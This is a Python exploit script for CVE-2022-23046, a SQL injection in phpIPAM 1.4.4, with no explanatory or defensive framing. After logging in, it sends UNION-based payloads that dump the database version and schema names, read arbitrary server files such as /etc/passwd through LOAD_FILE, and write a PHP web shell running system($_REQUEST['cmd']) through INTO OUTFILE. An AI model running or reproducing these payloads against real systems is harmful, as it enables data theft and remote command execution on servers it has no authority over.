import argparse
import requests
import re

class Phpipam():
    def __init__(self,target,username,password,file,write):
        self.target = target
        self.username = username
        self.password = password
        self.file = file
        self.write = write
        self.url = self.check_url()
        self.sql_url = self.url + "app/admin/routing/edit-bgp-mapping-search.php"

        self.session = requests.Session()
        self.login()
        if args.f:
            self.read_file()
        elif args.w:
            self.write_file()
        else:
            self.vulnerability_check()

    def check_url(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def login(self):
        requests.packages.urllib3.disable_warnings()
        url_login = self.url + "app/login/login_check.php"

        login_data = {
            "ipamusername":self.username,
            "ipampassword":self.password,
            "phpipamredirect":"/"
        }

        login_page = self.session.post(url_login,data=login_data,verify=False)
        if "Login successful" in login_page.text:
            print("\nLogin successful!")
    
    def vulnerability_check(self):
        requests.packages.urllib3.disable_warnings()
        check_payload = '" '
        sql_inj = {
            "subnet":check_payload,
            "bgp_id":"1"
        }
        sql_page = self.session.post(self.sql_url,data=sql_inj,verify=False)
        if "error in your SQL syntax" in sql_page.text:
            print("\nWeb page is vulnerable to SQL Injection! Getting version and database information\n")
            self.version_and_database()
        else:
            print("Unable to verify if web page is vulnerable to SQL Injection :(\n")
            exit()

    def version_and_database(self):
        version_payload = '" union select (select @@version),2,3,4-- -'
        print("Version is:")
        self.sql_injection(version_payload)

        print("Databases are:")
        db_payload = '" union select (select group_concat(SCHEMA_NAME," ") from Information_Schema.SCHEMATA),2,3,4-- -' 
        self.sql_injection(db_payload)

    def read_file(self):
        read_payload = '" union select (select group_concat("\\n\\n",LOAD_FILE(\'' + self.file + '\'),"\\n\\n")),2,3,4-- -'
        print("Attemping to read file " + self.file + ":")
        self.sql_injection(read_payload)

    def sql_injection(self,payload):
        requests.packages.urllib3.disable_warnings()
        sql_inj = {
            "subnet":payload,
            "bgp_id":"1"
        }

        sql_page = self.session.post(self.sql_url,data=sql_inj,verify=False)
        search = re.compile(r"<td> (.*?)/3", re.DOTALL)
        display = search.search(sql_page.text).group(1)

        print(display,"\n")

    def write_file(self):
        requests.packages.urllib3.disable_warnings()
        print("\nUploading file with PHP contents: <?php system($_REQUEST[\'cmd\']); ?> to " + self.write + "\n")
        write_payload = '" union select ("<?php system($_REQUEST[\'cmd\']); ?>"),2,3,4 into outfile "'+ self.write + '"-- -'

        sql_inj = {
            "subnet":write_payload,
            "bgp_id":"1"
        }

        sql_page = self.session.post(self.sql_url,data=sql_inj,verify=False)

        if "already exists" in sql_page.text:
            print("File already exists")
        elif "SQLSTATE[HY000]" in sql_page.text:
            print("File uploaded")
        else:
            print(sql_page.text)

if __name__ == "__main__":
    print("CVE-2022-23046 phpIPAM 1.4.4 - SQL Injection")
    parser = argparse.ArgumentParser(description='CVE-2022-23046 phpIPAM 1.4.4 - SQL Injection')

    parser.add_argument('-t', metavar='<Target base URL>', help='E.G: http://phpipam.com/', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-f', metavar='<File to Read', help="-f /etc/passwd", required=False)
    parser.add_argument('-w', metavar='<File to Write>', help="Use with file read to find location. -w cmd.php", required=False)
    args = parser.parse_args()

    try:
        Phpipam(args.t,args.u,args.p,args.f,args.w)
    except KeyboardInterrupt:
        print("Bye Bye")
        exit()